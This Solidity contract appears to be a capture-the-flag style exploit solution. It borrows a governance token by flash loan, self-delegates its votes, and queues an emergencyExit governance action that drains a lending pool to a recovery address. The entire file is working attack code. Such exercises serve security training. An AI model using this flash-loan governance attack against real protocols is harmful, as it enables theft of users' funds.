// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC3156FlashLender} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {ISimpleGovernance} from "../ISimpleGovernance.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";

contract FlashloanReceiver is Ownable, IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    ISimpleGovernance private immutable _gov;
    IERC3156FlashLender private immutable _pool;
    ERC20Votes private immutable _token;
    address private immutable _recovery;

    uint256 _actionId;

    constructor(address gov, address pool, address token, address recovery) Ownable(msg.sender) {
        _gov = ISimpleGovernance(gov);
        _pool = IERC3156FlashLender(pool);
        _token = ERC20Votes(token);
        _recovery = recovery;
    }

    function prepareAttack() external onlyOwner {
        _pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_token), _pool.maxFlashLoan(address(_token)), "");
    }

    function executeAttack() external onlyOwner {
        _gov.executeAction(_actionId);
    }

    function onFlashLoan(address initiator, address, uint256 amount, uint256, bytes calldata)
        external
        returns (bytes32)
    {
        require(initiator == address(this), "invalid initiator");
        require(msg.sender == address(_pool), "invalid caller");

        _token.delegate(address(this));

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", _recovery);
        _actionId = _gov.queueAction(address(_pool), 0, data);

        _token.approve(address(_pool), amount);

        return CALLBACK_SUCCESS;
    }
}
